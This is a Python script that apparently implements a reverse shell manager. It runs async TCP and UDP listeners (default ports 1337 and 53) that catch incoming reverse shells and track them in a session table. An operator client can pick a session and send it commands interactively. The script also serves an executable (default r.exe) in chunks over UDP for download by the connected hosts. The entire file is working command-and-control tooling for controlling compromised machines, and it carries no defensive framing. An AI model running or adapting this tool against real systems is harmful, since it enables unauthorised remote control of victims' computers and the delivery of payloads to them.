#!/usr/bin/env python3
import asyncio, time, os
import argparse
from pathlib import Path



parser = argparse.ArgumentParser()
parser.add_argument('-l', '--listen', action='extend', nargs='+', default=[], help='Reverseshell listener addresses, -l 0.0.0.0:53 -l 0.0.0.0:1337')
parser.add_argument('--rsm-ip', type=str, default="127.0.0.1", help='RSM Server/Client IP')
parser.add_argument('--rsm-port', type=int, default=7866, help='RSM Server/Client PORT')
parser.add_argument('--serve-file', type=str, default='/var/www/html/r.exe', help='File to serve (udp)')
args = parser.parse_args()

session_cpt = 0
sessions = {}
infos = []

dl_word =b"_RSM_DL_"
dl_word_len = len(dl_word)
dl_buffersize = 1024
dl_eof = b"UDPEOF"
dl_serve = False

keepalive = b"_KEEPALIVE_"
keepalive_len = len(keepalive)

if Path(args.serve_file).is_file():
    with open(args.serve_file, "rb") as f:
        dl_file = f.read()
        dl_serve = True

# RS Session => RSM => Client
async def ReadRS(session) -> None:
    if session["proto"] == "udp":
        while (session["lastread"]):
            while (session["rs_reader"]):
                n = min(2048, len(session["rs_reader"]))  # Ensure we don't remove more than available
                session["cli_writer"].write(bytes(session["rs_reader"][:n]))
                del session["rs_reader"][:n] # Remove from bytearray
            await session["cli_writer"].drain()
            await asyncio.sleep(0.1)
        return

    while (not session["rs_reader"].at_eof()):
        data = b""
        try:
            data = await asyncio.wait_for(session["rs_reader"].read(1), timeout=1)
        except asyncio.TimeoutError as te:
            pass
        
        if session["proto"] == "tcp":
            if (session["cli_writer"].is_closing()):
                break

        if len(data) > 0:
            session["cli_writer"].write(data)
            await session["cli_writer"].drain()
            session["lastread"] = time.time()

# Client => RSM => RS Session
async def WriteRS(session) -> None:
    while (not session["cli_reader"].at_eof() and session["lastread"]):
        data = await session["cli_reader"].readline()
        if session["proto"] == "tcp":
            if data == b"killme\n":
                session["rs_writer"].close()
                await session["rs_writer"].wait_closed()
                break

            if (session["rs_writer"].is_closing()):
                break

            session["rs_writer"].write(data)
            await session["rs_writer"].drain()

        else:
            session["rs_writer"].sendto(data, session["addr"])

# RS Session => RSM
async def handle_reverseshell_session(rs_reader: asyncio.StreamReader, rs_writer: asyncio.StreamWriter) -> None:
    global session_cpt, sessions
    addr = rs_writer.get_extra_info('peername')
    sessionid = session_cpt
    session_cpt = session_cpt+1
    ts = time.time()
    sessions[sessionid]={
        "proto":"tcp",
        "addr":addr,
        "lastread":ts,
        "rs_reader":rs_reader,
        "rs_writer":rs_writer
    }

    await asyncio.sleep(1)
    rs_writer.write(b"\n\n")
    await rs_writer.drain()

    while not rs_reader.at_eof():
        await asyncio.sleep(1)

    sessions[sessionid]["lastread"] = None

async def listen_for_reverseshell_tcp(HOST: str, PORT: int) -> None:
    srv = await asyncio.start_server(handle_reverseshell_session, HOST, PORT)
    async with srv:
        await srv.serve_forever()

class UDPServerProtocol:
    def connection_made(self, transport):
        self.transport = transport
        
    def datagram_received(self, data, addr):
        asyncio.create_task(self.handle_message(data, addr))

    async def handle_message(self, data, addr):
        if dl_serve and (data[:dl_word_len] == dl_word):
            dl_part = int(data[dl_word_len:])
            dl_start = dl_part*dl_buffersize
            dl_end = (dl_part+1)*dl_buffersize
            dl_buffer = dl_file[dl_start:dl_end]
            if dl_buffer :
                self.transport.sendto(dl_buffer, addr)
            else:
                self.transport.sendto(dl_eof, addr)
            return

        global session_cpt, sessions
        ts = time.time()
        foundid = None
        for sessionid, session in sessions.items():
            if str(session["addr"][0]) == str(addr[0]):
                if int(session["addr"][1]) == int(addr[1]):
                    foundid = sessionid
                    break

        if foundid == None :
            self.transport.sendto(b"\n\n", addr)
            sessionid = session_cpt
            session_cpt = session_cpt+1
            sessions[sessionid]={
                "proto":"udp",
                "addr":addr,
                "lastread":ts,
                "rs_reader":bytearray(),
                "rs_writer":self.transport
            }

        else:
            sessionid = foundid
            sessions[sessionid]["lastread"] = ts

        if data != keepalive:
            sessions[sessionid]["rs_reader"].extend(data)

async def listen_for_reverseshell_udp(HOST: str, PORT: int) -> None:
    loop = asyncio.get_running_loop()
    listen = await loop.create_datagram_endpoint(
        lambda: UDPServerProtocol(),
        local_addr=(HOST, PORT)
    )

    transport, protocol = listen
    try:
        await asyncio.Future()  # Keep running
    except asyncio.CancelledError:
        transport.close()

async def handle_rsm_client(cli_reader: asyncio.StreamReader, cli_writer: asyncio.StreamWriter) -> None:
    global sessions, infos
    while not cli_reader.at_eof():
        data = await cli_reader.readline()
        try:
            sessionid = int(data.decode('utf-8','ignore'))
        except:
            cli_writer.write(f"Pick a session\n".encode())
            [cli_writer.write(f"{x}\n".encode('utf-8')) for x in infos]
            await cli_writer.drain()
            continue

        if sessionid not in sessions.keys():
            cli_writer.write(f"Session {sessionid} not found, pick another one\n".encode())
            [cli_writer.write(f"{x}\n".encode('utf-8')) for x in infos]
            await cli_writer.drain()
            continue
        
        if sessions[sessionid]["lastread"] is None:
            cli_writer.write(f"Session {sessionid} is expired, pick another one\n".encode())
            [cli_writer.write(f"{x}\n".encode('utf-8')) for x in infos]
            await cli_writer.drain()
            continue

        session = sessions[sessionid]
        addr = session["addr"]
        cli_writer.write(f"Using session {sessionid} {addr[0]}:{addr[1]}\n".encode())
        await cli_writer.drain()
        break

    if "cli_writer" in session.keys():
        session["cli_writer"].close()
        await session["cli_writer"].wait_closed()
        cli_writer.write(f"Removed old RSM cli session\n".encode())
        await asyncio.sleep(1)

    session["cli_writer"] = cli_writer
    session["cli_reader"] = cli_reader

    tasks = [
        asyncio.create_task(ReadRS(session)),
        asyncio.create_task(WriteRS(session))
    ]
    await asyncio.wait(tasks,return_when=asyncio.FIRST_COMPLETED)

    cli_writer.write(f"End of RSM cli session\n".encode())
    session["cli_writer"].close()
    await session["cli_writer"].wait_closed()

async def listen_for_rsm_client(HOST: str, PORT: int) -> None:
    srv = await asyncio.start_server(handle_rsm_client, HOST, PORT)
    async with srv:
        await srv.serve_forever()

async def display(LISTENERS) -> None:
    global sessions, infos
    while True:
        os.system('clear')
        print("[*] Listening for reverse shell")
        for LISTENER in LISTENERS:
            if ':' in LISTENER:
                [HOST, PORT] = LISTENER.split(':')
            else:
                HOST = '0.0.0.0'
                PORT = LISTENER
            print(f"  {HOST}:{PORT}")

        print("\n[*] Sessions list")
        infos=[]
        for k,v in sessions.items():
            if v["lastread"] is None:
                lastread = "Dead"
                infos.insert(-1, f"  {k} {v['proto']}://{v['addr'][0]}:{v['addr'][1]} ({lastread})")
            else:
                lastread = round(time.time() - v["lastread"])
                lastread = f"Last read {lastread} seconds ago"
                infos.insert(0, f"  {k} {v['proto']}://{v['addr'][0]}:{v['addr'][1]} ({lastread})")

        infos = infos[0:20]
        for info in infos:
            print(info)

        await asyncio.sleep(1)

async def asyncmain(LISTENERS) -> None:
    tasks = []

    for LISTENER in LISTENERS:
        if ':' in LISTENER:
            [HOST, PORT] = LISTENER.split(':')
        else:
            HOST = '0.0.0.0'
            PORT = LISTENER

        tasks.append(listen_for_reverseshell_tcp(HOST,int(PORT)))
        tasks.append(listen_for_reverseshell_udp(HOST,int(PORT)))

    tasks.append(display(LISTENERS))
    tasks.append(listen_for_rsm_client(args.rsm_ip, args.rsm_port))
    await asyncio.gather(*tasks)

def main() -> None:
    LISTENERS = args.listen
    if not LISTENERS:
        LISTENERS.append('0.0.0.0:1337')
        if os.geteuid() == 0:
            LISTENERS.append('0.0.0.0:53')
    loop = asyncio.get_event_loop()
    loop.run_until_complete(asyncmain(LISTENERS))

if __name__ == '__main__':
    main()